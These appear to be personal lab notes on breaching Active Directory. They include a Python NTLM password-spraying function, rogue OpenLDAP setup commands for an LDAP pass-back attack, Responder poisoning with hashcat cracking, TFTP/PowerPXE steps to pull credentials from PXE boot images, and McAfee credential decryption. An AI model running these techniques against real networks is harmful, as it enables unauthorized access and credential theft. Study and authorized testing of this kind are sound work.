- ip 10.50.94.18

## OSINT
-  [Stack Overflow](https://stackoverflow.com/) questions with disclosed sensitive information
-  [Github](https://github.com/) files with credentials hardcoded.
- Disclosed info in previous breach: [HaveIBeenPwned](https://haveibeenpwned.com/) and [DeHashed](https://www.dehashed.com/)
- Phishing

## NTLM authenticated services
- Brute force with username/passwords
- Password spraying with credentials collected in OSINT
- Example script

```python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

```

## LDAP Bind Credentials
- If access is gained on Servers with LDAP services, then config files can be searched for their credentials
- `LDAP Pass-Back attack`: Update LDAP service config to point to our machine intercept any authentication calls
	- Listen on default port for LDAP - 389, won't work because it requires LDAP mesasge exchange
	- Point the LDAP service to use our IP as auth server, and connect once rogue server is ready.
	- Run a Rogue LDAP server `OpenLDAP` - 
		- Ensure that  LDAP server only supports PLAIN and LOGIN authentication methods

```
# Install ldap package
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

# Initial configuration
# Follow the steps with appropriate settings
sudo dpkg-reconfigure -p low slapd

# Ensure insecure auth, create new 'ldif' file with below config
# olcSaslSecProps: Specifies the SASL security properties
# noanonymous: Disables mechanisms that support anonymous login
# minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.
echo '#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred' > olcSaslSecProps.ldif


# use the ldif file to patch LDAP server:
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

# verify rogue LDAP server's configuration
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

# Start listening to network traffic
sudo tcpdump -SX -i breachad tcp port 389
```


## Authentication relays

- The Server Message Block (SMB) protocol allows clients (like workstations) to communicate with a server (like a file share).
- Two ways to exploit NTLM with SMB
	1. intercept NTLM Challenges, then use offline cracking techniques to recover the password associated
		- use [Responder](https://github.com/lgandx/Responder) to attempt to intercept the NetNTLM challenge
		- Responder will attempt to poison any  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected.
		- `sudo responder -I breachad` - Starts the responder service in the LAN network
		- If any auth is intercepted, extract the password hash and crack them using hydra: `hashcat -m 5600 <hash_list_file> <password_list_file> --force`
	- use rogue device to stage a MITM attack -> relay the SMB authentication between the client and server -> receive an active authenticated session and access to the target server.

## Microsoft Deployment Toolkit
- Microsoft's System Center Configuration Manager (SCCM) manages all updates for all Microsoft applications, services, and operating systems
- Microsoft Deployment Toolkit (MDT) is a Microsoft service that assists with automating the deployment of Microsoft Operating Systems (OS)
- One of the ways to maliciously configure MDT is Preboot Execution Environment (PXE) boot.
- We can exploit the PXE boot image for two different purposes:
	- Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
	- Perform password scraping attacks to recover AD credentials used during the install.
		- Extract MDT IP address
		- Extract BCD files list
		- use TFTP and download BCD file to read the configuration of the MDT server. TFTP is a bit trickier than FTP since we can't list files. Instead, we send a file request, and the server will connect back to us via UDP to transfer the file. Hence, we need to be accurate when specifying files and file paths. The BCD files are always located in the /Tmp/ directory on the MDT server.
		- `tftp -i <MDT IP> GET "\Tmp\bcdfilename.bcd" conf.bcd`
		- use [powerpxe](https://github.com/wavestone-cdt/powerpxe) to read the conf file
			- `Import-Module .\PowerPXE.ps1`
			- `Get-WimFile -bcdFile .\conf.bcd` - it will print the WIM file location which is bootable image in Windows Imaging Format.
		- Download the boot image using the above location
			- `tftp -i <MDT IP> GET "<PXE Boot Image Location>" pxeboot.wim`
		- Once download, the image can be modified to perform various attack. Read [Exploiting PXE images](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/)
		- Extract Credentials from the image: `Get-FindCredentials -WimFile pxeboot.wim`

## Configuration Files
- Web application config files  
- Service configuration files
- Registry keys
- Centrally deployed applications
- Enumerate config files using [Seabelt](https://github.com/GhostPack/Seatbelt)
- Example `McAfee`: `C:\ProgramData\McAfee\Agent\DB\ma.db` stores the credentials
	- Credentials are stored in `AGENT_REPOSITORIES` table
	- Use [McAfee pwd decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption) to decrypt the password hash
	